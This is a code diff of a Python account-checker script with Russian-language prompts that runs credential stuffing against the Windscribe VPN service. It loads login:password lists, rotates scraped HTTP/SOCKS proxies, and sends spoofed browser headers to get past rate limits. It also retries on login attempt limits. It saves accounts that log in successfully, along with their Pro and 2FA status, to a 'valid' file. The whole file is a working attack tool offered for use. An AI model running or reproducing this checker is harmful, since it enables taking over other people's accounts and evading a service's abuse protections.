@@ -1,188 +1,238 @@
 import time
-import re
 import requests
 from bs4 import BeautifulSoup
 from loguru import logger
 from random import choice
-import threading
+from threading import Thread
 import config
 global PROXE
 global ACCOUNTS
 
 with open("accounts.txt", "r", encoding="utf-8") as file:
-    ACCOUNTS = file.read().split("\n")
+    data = file.read().split("\n")
 
-with open("proxies.txt", "r", encoding="utf-8") as file:
-    PROXE = file.read().split("\n")
 
-START = True
 
-class Bot():
-    def __init__(self, login, password):
+
+class Winscribe():
+    def __init__(self, UserChoice, Link):
         self.host = "https://rus.windscribe.com"
-        self.login = login
-        self.password = password
+        self.Link = Link
+        self.UserChoice = UserChoice
 
-    def get_ip(self):
+    def ScrapProxy(self):
+        while True:
+            try:
+                r = requests.get(self.Link)
+                with open("config/proxies.txt", "w", encoding="utf-8") as file: file.write(str(r.text))
+                proxylen = str(r.text).split('\n')
+                logger.success(f"Обновил список прокси: {len(proxylen)} проксей")
+                time.sleep(6)
+            except Exception as ex:
+                time.sleep(2)
+
+    def check_proxy(self):
+            try:
+                while True:
+
+                    with open("config/proxies.txt", "r", encoding="utf-8") as file:
+                        proxy = file.read().split("\n")
+
+                    RandomProxy = choice(proxy)
+
+                    proxyDict = {}
+                    if self.UserChoice == 1:
+                        proxyDict = {
+                            "http": "http://" + RandomProxy,
+                            "https": "http://" + RandomProxy,
+                        }
+                    elif self.UserChoice == 2:
+                        proxyDict = {
+                            "http": "socks5://" + RandomProxy,
+                            "https": "socks5://" + RandomProxy,
+                        }
+
+                    elif self.UserChoice == 2:
+                        proxyDict = {
+                            "http": "socks4://" + RandomProxy,
+                            "https": "socks4://" + RandomProxy,
+                        }
+
+                    ip = requests.get("https://api64.ipify.org?format=json", proxies=proxyDict)
+
+                    if int(ip.status_code) == 200:
+                        return proxyDict
+
+            except: pass
+
+    def start(self):
         try:
             while True:
-                random_proxy = choice(PROXE)
-                proxy = random_proxy
-                PROXE.remove(random_proxy)
+                info = choice(data)
 
-                PROXYES = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
+                login = info.split(":")[0]
+                password = info.split(":")[1]
 
+                valid_proxy = self.check_proxy()
 
-                self.client = requests.session()
-                self.client.proxies.update(PROXYES)
-
-                ip = self.client.get("https://api64.ipify.org?format=json").json()
-
-                logger.success(f"Найден валидный прокси: {ip['ip']}")
-
-                with open("valid_proxies.txt", "a", encoding="utf-8") as file:
-                    file.write(f"{proxy}\n")
-        except:
-            pass
-
-    def check(self):
-
-        try:
-
-            if START == False:
-                while True:
-                    if START:
-                        self.check()
-                    else:
-                        time.sleep(30)
-
-
-            elif START:
-                for i in range(0, 2):
-                    logger.debug(f"Проверяю аккаунт: {self.login}:{self.password}")
-                    proxy = choice(PROXE)
-
-                    PROXYES = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
-
-                    self.client = requests.session()
-                    # self.client.proxies.update(PROXYES)
-
-
-                    data = {
-                        "csrf_time" : str(time.time()).split(".")[0],
-                    }
-
-                    r = self.client.post("https://res.windscribe.com/res/logintoken", data=data)
-
-                    time.sleep(0.3)
-
-                    csrf = r.json()["csrf_token"]
-                    logger.info(r.json())
-                    logger.info(f"Успешно получен csrf-token: {csrf}")
-
-
-                    data = {
-                        "login": "1",
-                        "upgrade": "0",
-                        "csrf_time": str(time.time()).split(".")[0],
-                        "csrf_token": csrf,
-                        "username": self.login,
-                        "password": self.password,
-                        "code" : ""
-                    }
-
-                    r = self.client.post("https://rus.windscribe.com/login", data=data)
-
-                    try:
-                        ban_check = len(r.text)
-                        if ban_check > 5:
-                            soup = BeautifulSoup(r.text, "lxml")
-                            check = soup.find("div", {"class" : "content_message error"}).text
-                            logger.critical(check)
-
-                            if "Превышен лимит" in check or "Rate limited":
-                                if self.start:
-                                    self.start = False
-                                    time.sleep(300)
-                                    self.start = True
-                    except: pass
-                    time.sleep(0.3)
-
-                    r = self.client.get("https://rus.windscribe.com/myaccount")
-
-                    soup = BeautifulSoup(r.text, "lxml")
-
-                    articles = soup.find_all("div", {"class" : "ma_item"})
-                    reg_date = articles[1].text.split("\n")[3]
-                    status = articles[4].text.split("\n")[3]
-                    next_reset = articles[5].text.split("\n")[2]
-                    trafic_parse = articles[6].text.split("\n")
-                    trafic = trafic_parse[3] + " " + trafic_parse[4]
-                    get_status_GB = trafic.split(" ")[0].replace("GB", "")
-
-                    text = f"login: {self.login} | password: {self.password} | reg_date: {reg_date} | status: {status} | next_reset: {next_reset} | trafic: {trafic}\n"
-
-
-                    logger.success(f"Успешно найден валидный аккаунт\nreg_date: {reg_date}\nstatus: {status}\nnext_reset: {next_reset}\ntrafic: {trafic}")
+                WhatRetry = self.check(valid_proxy, login, password)
 
 
 
-                    if int(config.status) <= int(get_status_GB):
-                        with open("valid.txt", "a+", encoding="utf-8") as file: file.write(text)
-                    return
+                if WhatRetry == True:
+                    data.remove(info)
 
-        except IndexError:
-            logger.error(f"Аккаунт невалид: {self.login}:{self.password}")
+                elif WhatRetry == False:
+                    data.remove(info)
+
+                elif WhatRetry == "retry":
+                    continue
 
         except Exception as ex:
-            print(ex)
-            # logger.critical("Неизвестная ошибка, отпишите кодеру: @Benefix")
-            # logger.info(ex)
-        return
+            pass
+
+    def check(self, proxy_list, username, password):
+        try:
+
+
+            req = requests.Session()
+
+            headers = {
+                'accept': '*/*',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+                'content-length': '0',
+                'origin': 'https://windscribe.com',
+                'referer': 'https://windscribe.com/',
+                'sec-ch-ua': '"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-site',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
+            }
+
+            r = req.post('https://res.windscribe.com/res/logintoken',
+                         headers=headers, proxies=proxy_list, timeout=2).json()
+            token = r['csrf_token']
+            time = r['csrf_time']
+
+            data = {
+                'login': '1',
+                'upgrade': '0',
+                'csrf_time': time,
+                'csrf_token': token,
+                'username': username,
+                'password': password,
+                'code': ''
+            }
+
+            headers1 = {
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+                'cache-control': 'max-age=0',
+                'content-length': '144',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://windscribe.com',
+                'referer': 'https://windscribe.com/login',
+                'sec-ch-ua': '"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-user': '?1',
+                'upgrade-insecure-requests': '1',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36'
+            }
+
+            t = req.post('https://windscribe.com/login', data=data,
+                         headers=headers1, proxies=proxy_list, timeout=2)
+
+            if 'My Account - Windscribe' in t.text:
+                p = req.get('https://windscribe.com/myaccount', proxies=proxy_list, timeout=2)
+
+                username = p.text.split('<h2>Username</h2>\n<span>')[1].split('</span>')[0]
+                creation_date = p.text.split( 'Account</a></h2>\n<span>')[1].split('</span>')[0]
+                account_status = p.text.split('<span id="ma_account_status">\n<strong>')[ 1].split('<')[0]
+
+                bandwith = p.text.split('<h2>Bandwidth Usage</h2>\n<span>')[1].split('</span>')[0]
+                bandwith = bandwith.replace('\n', '')
+
+                fa_status = p.text.split('<span id="ma_account_2fa_status">\n<strong>')[1].split('</strong>')[0]
+
+                comparer = p.text.replace('"', '')
+
+
+                if 'Disabled' in fa_status and "ma_account_status').html('<i class=ma_green_star></i> <strong>Pro</strong>" in comparer:
+
+                    with open('config/valid.txt', 'a', encoding='utf-8', errors='ignore') as g:
+                        g.writelines(f'{username}:{password} - User: {username} - Creation: {creation_date} - Status: {account_status} - Bandwith: {bandwith}\n')
+
+                    logger.success(f'{username}:{password} - User: {username} - Creation: {creation_date} - Status: {account_status} - Bandwith: {bandwith}\n')
+
+                    return True
+
+
+                elif not "ma_account_status').html('<i class=ma_green_star></i> <strong>Pro</strong>" in comparer and 'Disabled' in fa_status:
+                    with open('config/valid.txt', 'a', encoding='utf-8', errors='ignore') as g:
+                        g.writelines( f'{username}:{password} - User: {username} - Creation: {creation_date} - Status: {account_status} - Bandwith: {bandwith}\n')
+
+                    logger.success(f'{username}:{password} - User: {username} - Creation: {creation_date} - Status: {account_status} - Bandwith: {bandwith}\n')
+
+                    return True
+
+
+
+                elif not 'Disabled' in fa_status:
+                    with open('config/bad.txt', 'a', encoding='utf-8', errors='ignore') as g:
+                        g.writelines(f'username: {username} | password: {password} | bad 2fa\n')
+
+                    return False
+
+                return True
+
+
+
+            elif 'Login is not correct' in t.text:
+                return False
+
+            elif 'Login attempt limit reached' in t.text:
+                return "retry"
+
+            elif "Rate limited, please wait before trying to login again" in t.text:
+                return  "retry"
+
+            if len(t.text) > 50:
+                with open("test/html.html", "w", encoding="utf-8") as file: file.write(str(t.text))
+
+        except Exception as ex:
+            return "retry"
 
 
 
 def winscribe():
+    try:
+        UserChoice = int(input("Выберите вид прокси:\n1 - HTTP / HTTPS\n2 - SOCKS5\n3 - SOCKS4\n\nВведите цифру: "))
+        Link =  input("Введите прямую ссылку с прокси: ")
+        ThreadChoice = int(input("Потоков: "))
 
-    for i in range(len(ACCOUNTS)):
-        try:
-            info = ACCOUNTS.pop()
-            logger.success(info)
-            login = info.split(":")[0]
-            password = info.split(":")[1]
+        Bot = Winscribe(UserChoice, Link)
 
-            bot = Bot(login, password)
-            if START:
-                threading.Thread(target=bot.check).start()
-            else:
-                while True:
-                    if START:
-                        threading.Thread(target=bot.check).start()
-                    else:
-                        time.sleep(30)
+        Thread(target=Bot.ScrapProxy).start()
+        for i in range(0, ThreadChoice):
+            Thread(target=Bot.start).start()
 
-            time.sleep(5)
-
-        except Exception as ex: return
-
-def proxies():
-    bot = Bot("123", "123").get_ip()
+    except: pass
 
 
-def main():
-    choice_user = int(input("1 - чек прокси\n2 - check winscribe\nВведите цифру: "))
-
-    if choice_user == 1:
-        choice_threading = int(input("Введите в сколько потоков запускать скрипт: "))
-
-        for i in range(choice_threading):
-            x = threading.Thread(target=proxies).start()
-
-    elif choice_user == 2:
-        winscribe()
-        # for i in range(choice_threading):
-        #     x = threading.Thread(target=winscribe).start()
-        #     time.sleep(3)
 
 if __name__ == "__main__":
-    main()
+    winscribe()
+
+#                text = f"login: {self.login} | password: {self.password} | reg_date: {reg_date} | status: {status} | next_reset: {next_reset} | trafic: {trafic}\n"
+#                logger.success(f"Успешно найден валидный аккаунт\nreg_date: {reg_date}\nstatus: {status}\nnext_reset: {next_reset}\ntrafic: {trafic}")
+#                with open("config/valid.txt", "a+", encoding="utf-8") as file: file.write(text)
+#                return True
